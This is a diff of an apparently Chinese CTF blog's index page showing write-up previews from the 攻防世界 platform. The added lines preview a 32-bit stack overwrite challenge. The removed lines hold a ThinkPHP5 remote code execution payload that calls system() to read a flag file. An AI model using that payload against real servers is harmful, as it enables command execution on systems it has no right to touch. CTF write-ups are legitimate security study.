@@ -224,6 +224,41 @@
         <div class="row">
             <div class="col-md-8 col-md-offset-2 opening-statement">
                 <div class="col-md-4">
+                    <h3><a href="/2020/02/08/攻防世界forgot/">攻防世界forgot</a></h3>
+                    <span>
+                        <span class="post-meta">
+      <time datetime="2020-02-08T03:54:30.000Z" itemprop="datePublished">
+          2020-02-08
+      </time>
+    
+</span>
+                    </span>
+                </div>
+                <div class="col-md-8">
+                    <p>
+                      
+                        forgot首先检查一下文件
+Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)可以确定的是栈上面的变量覆盖，但是覆盖地址的时候需要注意*(&amp;v3 + –v14)这个式子，我们需要把函数地址放到这个地址上面(&amp;v3是栈上面的地
+                      
+                    </p>
+                    
+                    <p class="pull-right readMore">
+                        <a href="/2020/02/08/攻防世界forgot/">Read More...</a>
+                    </p>
+                    
+                </div>
+                <div class="clearfix"></div>
+                <hr class="nogutter">
+            </div>
+        </div>
+        
+        <div class="row">
+            <div class="col-md-8 col-md-offset-2 opening-statement">
+                <div class="col-md-4">
                     <h3><a href="/2020/02/08/攻防世界Mary-Morton/">攻防世界Mary_Morton</a></h3>
                     <span>
                         <span class="post-meta">
@@ -535,45 +570,6 @@ level 61、这关考察的是对默认端口的熟悉程度、2、Mstsc是Window
                     
                     <p class="pull-right readMore">
                         <a href="/2020/01/19/黑客丛林之旅/">Read More...</a>
-                    </p>
-                    
-                </div>
-                <div class="clearfix"></div>
-                <hr class="nogutter">
-            </div>
-        </div>
-        
-        <div class="row">
-            <div class="col-md-8 col-md-offset-2 opening-statement">
-                <div class="col-md-4">
-                    <h3><a href="/2020/01/19/攻防世界高手进阶区PHP-rec/">攻防世界高手进阶区PHP_rec</a></h3>
-                    <span>
-                        <span class="post-meta">
-      <time datetime="2020-01-19T01:35:33.000Z" itemprop="datePublished">
-          2020-01-19
-      </time>
-    
-    
-    | 
-    <a href='/tags/WEB，php/'>WEB，php</a>
-    
-    
-</span>
-                    </span>
-                </div>
-                <div class="col-md-8">
-                    <p>
-                      
-                        php_rec进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。
-
-?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag
-
-
-                      
-                    </p>
-                    
-                    <p class="pull-right readMore">
-                        <a href="/2020/01/19/攻防世界高手进阶区PHP-rec/">Read More...</a>
                     </p>
                     
                 </div>
